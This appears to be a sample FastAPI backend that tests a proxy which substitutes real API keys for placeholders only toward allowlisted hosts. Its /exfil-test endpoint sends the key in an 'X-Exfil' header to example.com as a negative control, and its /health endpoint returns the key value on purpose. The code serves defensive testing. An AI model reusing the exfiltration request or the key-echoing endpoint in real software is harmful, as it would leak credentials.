"""
Sample FastAPI backend for the desolate chain test.

Demonstrates BOTH properties at once:

  * the three-level path works
      Mac browser -> dind relay -> devcontainer -> this container (level 3)

  * the secret is never in the container
      This process sees only a PLACEHOLDER. When it calls the real API, the
      VM proxy substitutes the true value in-flight -- and refuses to do so
      toward any host outside that secret's allowlist.
"""

import os

import httpx
from fastapi import FastAPI
from dotenv import load_dotenv

app = FastAPI(title="desolate sample")

load_dotenv()
PLACEHOLDER = os.environ.get("OPENAI_API_KEY", "")


@app.get("/")
def root():
    return {
        "message": "FastAPI is running inside a level-3 container.",
        "chain": "Mac browser -> dind relay -> devcontainer -> this container",
    }


@app.get("/health")
def health():
    # Deliberately shows the value: under this design it is a placeholder, so
    # printing it is harmless -- and it proves no real key is present here.
    return {
        "status": "ok",
        "api_key_seen_by_this_container": PLACEHOLDER or "(unset)",
        "note": "this is a placeholder; the real value exists only in the VM",
    }


@app.get("/live-call")
async def live_call():
    """Prove substitution end to end: we send the PLACEHOLDER, the proxy swaps
    in the real key, and OpenAI answers. Requires:
        ./cli.sh secret add SAMPLE-FASTAPI-OPENAI-KEY --hosts api.openai.com
    """
    if not PLACEHOLDER:
        return {"error": "OPENAI_API_KEY is unset"}
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            r = await client.get(
                "https://api.openai.com/v1/models",
                headers={"Authorization": f"Bearer {PLACEHOLDER}"},
            )
        # The BODY is the whole diagnosis, and returning only a status code
        # makes this endpoint undebuggable -- a 403 could be the proxy refusing
        # to substitute, or OpenAI refusing the key, and those need opposite
        # fixes. The proxy's own refusals always start "desolate-proxy:", so
        # the two are distinguishable at a glance.
        #
        # Safe to show: responses are scrubbed on the way back, so a real secret
        # value cannot appear here even if the upstream echoed it.
        body = r.text[:300]
        proxy_blocked = body.startswith("desolate-proxy:")
        return {
            "status_code": r.status_code,
            "worked": r.status_code == 200,
            "refused_by": "desolate-proxy" if proxy_blocked else "openai",
            "body": body,
            "hint": (
                "the PROXY blocked this -- check './cli.sh secret list' and "
                "'./cli.sh proxy logs' for a LEAK/DENY line"
                if proxy_blocked else
                "401: the secret is not configured in the VM. "
                "403: your key reached OpenAI and OpenAI refused it -- read 'body'. "
                "200: substitution worked end to end."
            ),
        }
    except Exception as exc:  # noqa: BLE001
        return {
            "error": type(exc).__name__,
            "detail": str(exc)[:200],
            "hint": "TLS errors usually mean the proxy CA isn't trusted here",
        }


@app.get("/exfil-test")
async def exfil_test():
    """Negative control: send the same placeholder somewhere it is NOT allowed.
    The proxy should block this with 403 and log a LEAK line."""
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.get(
                "https://example.com/", headers={"X-Exfil": PLACEHOLDER}
            )
        body = r.text[:200]
        return {
            "status_code": r.status_code,
            "blocked_as_expected": r.status_code == 403
                                   and body.startswith("desolate-proxy:"),
            # Distinguishes OUR 403 from a coincidental upstream one -- without
            # this, a site that happens to return 403 would look like proof the
            # leak detection works.
            "body": body,
        }
    except Exception as exc:  # noqa: BLE001
        return {"error": type(exc).__name__, "detail": str(exc)[:200]}
